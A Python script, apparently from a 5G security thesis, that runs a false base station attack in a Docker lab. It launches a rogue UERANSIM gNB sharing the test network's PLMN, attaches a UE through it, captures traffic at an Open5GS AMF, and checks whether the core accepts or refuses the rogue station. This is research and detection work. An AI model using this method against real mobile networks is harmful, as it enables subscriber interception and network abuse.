#!/usr/bin/env python3
"""
False Base Station Attack - FGT1588.501
Thesis: On Enhancing 5G Security
Method: Rogue gNB with same PLMN connects to AMF
"""
import subprocess
import time
import os

BASE_DIR     = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
CAPTURE_FILE = os.path.join(BASE_DIR, "captures", "false_bs.pcap")
LOG_FILE     = os.path.join(BASE_DIR, "logs", "false_bs.log")
CONFIG_DIR   = os.path.join(BASE_DIR, "config")
COMPOSE_FILE = os.path.join(BASE_DIR, "docker-compose.yml")

def log(msg):
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}")

def main():
    os.makedirs(os.path.join(BASE_DIR, "logs"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, "captures"), exist_ok=True)

    log("=" * 60)
    log("FALSE BASE STATION ATTACK - FGT1588.501")
    log("Target: AMF NG Setup Authentication")
    log("Method: Rogue gNB with same PLMN (001/01)")
    log("Rogue gNB: TAC=99, IP=10.10.0.50")
    log("=" * 60)

    # PHASE 1: Start capture
    log("\n[PHASE 1] Starting capture...")
    subprocess.run("docker exec open5gs-amf rm -f /tmp/false_bs.pcap", shell=True)
    subprocess.Popen(
        "docker exec open5gs-amf tcpdump -i any -w /tmp/false_bs.pcap",
        shell=True
    )
    time.sleep(3)
    log("[*] Capture started.")

    # PHASE 2: Start Rogue gNB
    log("\n[PHASE 2] Starting Rogue gNB...")
    subprocess.run("docker rm -f ueransim-rogue-gnb 2>/dev/null", shell=True)

    subprocess.run(
        f"""docker run -d \
            --name ueransim-rogue-gnb \
            --network thesis-5g_5gcore \
            --ip 10.10.0.50 \
            -v {CONFIG_DIR}/rogue-gnb.yaml:/etc/ueransim/gnb.yaml \
            ueransim-custom:3.2.7 gnb /etc/ueransim/gnb.yaml""",
        shell=True
    )

    # Restart ue1/ue2 to make SCTP visible in capture
    subprocess.run(
        f"docker compose -f {COMPOSE_FILE} restart ue1 ue2",
        shell=True, capture_output=True
    )
    time.sleep(40)

    gnb_logs = subprocess.run(
        "docker logs ueransim-rogue-gnb 2>&1 | tail -15",
        shell=True, capture_output=True, text=True
    ).stdout
    saved_gnb_logs = gnb_logs
    log(f"[*] Rogue gNB logs:\n{gnb_logs}")

    # PHASE 3: Connect UE via Rogue gNB
    log("\n[PHASE 3] Connecting UE via Rogue gNB...")
    subprocess.run("docker rm -f ueransim-ue-rogue 2>/dev/null", shell=True)

    subprocess.run(
        f"""docker run -d \
            --name ueransim-ue-rogue \
            --network thesis-5g_5gcore \
            --ip 10.10.0.51 \
            --privileged \
            -v {CONFIG_DIR}/ue-rogue.yaml:/etc/ueransim/ue.yaml \
            ueransim-custom:3.2.7 ue /etc/ueransim/ue.yaml""",
        shell=True
    )
    time.sleep(40)

    ue_logs = subprocess.run(
        "docker logs ueransim-ue-rogue 2>&1 | tail -10",
        shell=True, capture_output=True, text=True
    ).stdout
    log(f"[*] UE-Rogue logs:\n{ue_logs}")

    # Update gnb logs before cleanup
    fresh_gnb = subprocess.run(
        "docker logs ueransim-rogue-gnb 2>&1 | tail -15",
        shell=True, capture_output=True, text=True
    ).stdout
    if fresh_gnb.strip():
        saved_gnb_logs = fresh_gnb

    # PHASE 4: Stop capture
    log("\n[PHASE 4] Stopping capture...")
    subprocess.run("docker exec open5gs-amf pkill tcpdump", shell=True)
    time.sleep(2)
    subprocess.run(f"docker cp open5gs-amf:/tmp/false_bs.pcap {CAPTURE_FILE}", shell=True)

    # Verify pcap
    pkt_count = subprocess.run(
        f"tshark -r {CAPTURE_FILE} 2>/dev/null | wc -l",
        shell=True, capture_output=True, text=True
    ).stdout.strip()
    ngap_count = subprocess.run(
        f"tshark -r {CAPTURE_FILE} 2>/dev/null | grep -iE 'ngap|sctp' | wc -l",
        shell=True, capture_output=True, text=True
    ).stdout.strip()
    log(f"[*] Packets in capture: {pkt_count}")
    log(f"[*] NGAP/SCTP packets:  {ngap_count}")

    # PHASE 5: Analyze
    log("\n[PHASE 5] Analyzing results...")

    result = subprocess.run(
        f"tshark -r {CAPTURE_FILE} -d 'sctp.port==38412,ngap' 2>/dev/null "
        f"| grep -iE 'NGSetup|Registration|Auth'",
        shell=True, capture_output=True, text=True
    ).stdout

    # No --since filter — check all AMF logs for rogue gNB evidence
    amf_result = subprocess.run(
        "docker logs open5gs-amf 2>&1 "
        "| grep -iE 'refused|10.10.0.50|accepted.*10.10.0.50' | tail -10",
        shell=True, capture_output=True, text=True
    ).stdout

    ng_setup_response  = "NGSetupResponse" in result
    ng_setup_failure   = "NGSetupFailure" in result
    connection_refused = "refused" in amf_result.lower()
    gnb_accepted       = "accepted" in amf_result.lower() and "10.10.0.50" in amf_result
    auth_seen          = "Authentication" in result

    log(f"[*] Key packets:\n{result}")
    log(f"[*] AMF logs:\n{amf_result}")
    log(f"[*] Rogue gNB logs:\n{saved_gnb_logs}")

    with open(LOG_FILE, 'w') as f:
        f.write("=== TSHARK OUTPUT ===\n")
        f.write(result)
        f.write("\n=== AMF LOGS ===\n")
        f.write(amf_result)
        f.write("\n=== ROGUE GNB LOGS ===\n")
        f.write(saved_gnb_logs)

    # Cleanup after analysis
    subprocess.run("docker rm -f ueransim-rogue-gnb ueransim-ue-rogue 2>/dev/null", shell=True)

    log("\n" + "=" * 60)
    log("FALSE BASE STATION RESULTS")
    log(f"Rogue gNB accepted by AMF:       {'YES ✓' if gnb_accepted else 'NO'}")
    log(f"Rogue gNB NG Setup accepted:     {'YES ✓' if ng_setup_response else 'NO'}")
    log(f"Rogue gNB NG Setup rejected:     {'YES ✓' if ng_setup_failure else 'NO'}")
    log(f"AMF connection refused:          {'YES ✓' if connection_refused else 'NO'}")
    log(f"UE Authentication via rogue gNB: {'YES ✓' if auth_seen else 'NO'}")
    log(f"NGAP/SCTP packets:               {ngap_count}")
    log("Attack DETECTED ✓" if connection_refused or gnb_accepted else "No detection")
    log("=" * 60)
    log(f"[*] Log:     {LOG_FILE}")
    log(f"[*] Capture: {CAPTURE_FILE}")

if __name__ == "__main__":
    main()
